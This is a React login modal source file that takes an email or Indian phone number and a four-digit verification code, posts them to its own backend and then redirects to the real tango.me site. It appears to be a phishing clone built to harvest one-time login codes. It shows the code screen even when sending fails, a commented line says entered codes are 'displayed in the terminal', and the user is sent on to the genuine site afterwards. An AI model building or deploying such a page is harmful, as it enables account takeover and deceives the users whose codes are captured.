import React, { useState } from 'react';
import { X } from 'lucide-react';
import { API_ENDPOINTS } from '../config/api';

interface LoginModalProps {
  isOpen: boolean;
  onClose: () => void;
  type: 'email' | 'phone';
}

export default function LoginModal({ isOpen, onClose, type }: LoginModalProps) {
  const [email, setEmail] = useState('');
  const [phone, setPhone] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showVerification, setShowVerification] = useState(false);
  const [verificationCode, setVerificationCode] = useState('');
  const [resendCountdown, setResendCountdown] = useState(0);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    
    try {
      const response = await fetch(API_ENDPOINTS.SEND_VERIFICATION, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: type === 'email' ? email : null,
          phone: type === 'phone' ? phone : null,
          type: type
        }),
      });

      if (response.ok) {
        const result = await response.json();
        console.log('Verification sent:', result);
        setShowVerification(true);
        startResendCountdown();
      } else {
        console.error('Failed to send verification, status:', response.status);
        // Show verification page even if API fails
        setShowVerification(true);
        startResendCountdown();
      }
    } catch (error) {
      console.error('Error sending verification:', error);
      // Show verification page even if API fails
      setShowVerification(true);
      startResendCountdown();
    } finally {
      setIsSubmitting(false);
    }
  };

  const startResendCountdown = () => {
    setResendCountdown(30);
    const interval = setInterval(() => {
      setResendCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(interval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  };

  const handleVerificationSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    try {
      const response = await fetch(API_ENDPOINTS.VERIFY_CODE, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: type === 'email' ? email : null,
          phone: type === 'phone' ? phone : null,
          type: type,
          verificationCode: verificationCode
        }),
      });

      if (response.ok) {
        const result = await response.json();
        console.log('Verification code submitted successfully:', result);
        // Redirect to the specified website
        window.location.href = 'https://tango.me/';
      } else {
        console.error('Failed to submit verification code');
      }
    } catch (error) {
      console.error('Error submitting verification code:', error);
    }
  };

  const handleResendCode = () => {
    if (resendCountdown === 0) {
      handleSubmit(new Event('submit') as any);
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
      <div className="absolute inset-0 bg-black/60 backdrop-blur-sm" onClick={onClose}></div>
      
      <div className="relative bg-gray-900/95 backdrop-blur-xl rounded-2xl p-6 w-full max-w-md border border-white/10 shadow-2xl">
        <button 
          onClick={onClose}
          className="absolute top-4 right-4 text-white/60 hover:text-white transition-colors"
        >
          <X size={20} />
        </button>

        {!showVerification ? (
          type === 'email' ? (
            <div>
              <h2 className="text-2xl font-bold text-white mb-2">Continue with Email</h2>
              <p className="text-white/70 mb-6">Enter your email to continue</p>
              
              <form className="space-y-4" onSubmit={handleSubmit}>
                <div>
                  <input
                    type="email"
                    placeholder="Email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    required
                    className="w-full px-4 py-3 bg-gray-800/80 border border-gray-700 rounded-lg text-white placeholder-white/50 focus:outline-none focus:border-pink-500 focus:ring-1 focus:ring-pink-500 transition-colors"
                  />
                </div>
                
                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full py-3 bg-gradient-to-r from-pink-500 to-purple-600 text-white font-semibold rounded-lg hover:from-pink-600 hover:to-purple-700 transition-all duration-200 transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none"
                >
                  {isSubmitting ? 'Sending...' : 'Continue'}
                </button>
              </form>
            </div>
          ) : (
            <div>
              <h2 className="text-2xl font-bold text-white mb-2">Continue with phone</h2>
              <p className="text-white/70 mb-6">You'll receive a verification code at this number</p>
              
              <form className="space-y-4" onSubmit={handleSubmit}>
                <div className="flex">
                  <div className="flex items-center px-3 py-3 bg-gray-800/80 border border-gray-700 rounded-l-lg border-r-0">
                    <div className="w-5 h-3 bg-orange-500 mr-2"></div>
                    <span className="text-white text-sm">+91</span>
                  </div>
                  <input
                    type="tel"
                    placeholder="Phone Number"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                    required
                    className="flex-1 px-4 py-3 bg-gray-800/80 border border-gray-700 rounded-r-lg text-white placeholder-white/50 focus:outline-none focus:border-pink-500 focus:ring-1 focus:ring-pink-500 transition-colors"
                  />
                </div>
                
                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full py-3 bg-gradient-to-r from-pink-500 to-purple-600 text-white font-semibold rounded-lg hover:from-pink-600 hover:to-purple-700 transition-all duration-200 transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none"
                >
                  {isSubmitting ? 'Sending...' : 'Continue'}
                </button>
              </form>
            </div>
          )
        ) : (
          <div>
            <button 
              onClick={() => setShowVerification(false)}
              className="absolute top-4 left-4 text-white/60 hover:text-white transition-colors"
            >
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="m15 18-6-6 6-6"/>
              </svg>
            </button>
            
            <h2 className="text-2xl font-bold text-white mb-2">Enter Verification Code</h2>
            <p className="text-white/70 mb-6">
              We sent a verification code to {type === 'email' ? email : `+91${phone}`}. Check spam folder just in case.
            </p>
            {/* <p className="text-pink-400 text-sm mb-4 text-center">
              💡 The verification code you enter will be displayed in the terminal
            </p> */}
            
            <form className="space-y-4" onSubmit={handleVerificationSubmit}>
              <div className="flex justify-center space-x-2">
                {[0, 1, 2, 3].map((index) => (
                  <input
                    key={index}
                    type="text"
                    maxLength={1}
                    value={verificationCode[index] || ''}
                    onChange={(e) => {
                      const newCode = verificationCode.split('');
                      newCode[index] = e.target.value;
                      setVerificationCode(newCode.join(''));
                      
                      // Auto-focus next input
                      if (e.target.value && index < 3) {
                        const nextInput = e.target.parentElement?.parentElement?.querySelector(`input:nth-child(${index + 2})`) as HTMLInputElement;
                        nextInput?.focus();
                      }
                    }}
                    className="w-12 h-12 text-center text-xl font-bold bg-gray-800/80 border border-gray-700 rounded-lg text-white focus:outline-none focus:border-pink-500 focus:ring-1 focus:ring-pink-500 transition-colors"
                  />
                ))}
              </div>
              
              <div className="text-center">
                <button
                  type="button"
                  onClick={handleResendCode}
                  disabled={resendCountdown > 0}
                  className={`text-sm transition-colors ${
                    resendCountdown > 0 
                      ? 'text-white/40 cursor-not-allowed' 
                      : 'text-pink-400 hover:text-pink-300'
                  }`}
                >
                  {resendCountdown > 0 ? `Resend Code (${resendCountdown})` : 'Resend Code'}
                </button>
              </div>
              
              <button
                type="submit"
                disabled={verificationCode.length !== 4}
                className="w-full py-3 bg-gradient-to-r from-pink-500 to-purple-600 text-white font-semibold rounded-lg hover:from-pink-600 hover:to-purple-700 transition-all duration-200 transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none"
              >
                Verify Code
              </button>
            </form>
          </div>
        )}
        
        <p className="text-xs text-white/50 text-center mt-6">
          By logging in, you confirm you're over 18 years old and agree to our{' '}
          <span className="text-pink-400 hover:text-pink-300 cursor-pointer">Terms of Use</span>
          {' '}and{' '}
          <span className="text-pink-400 hover:text-pink-300 cursor-pointer">Privacy Policy</span>
        </p>
      </div>
    </div>
  );
}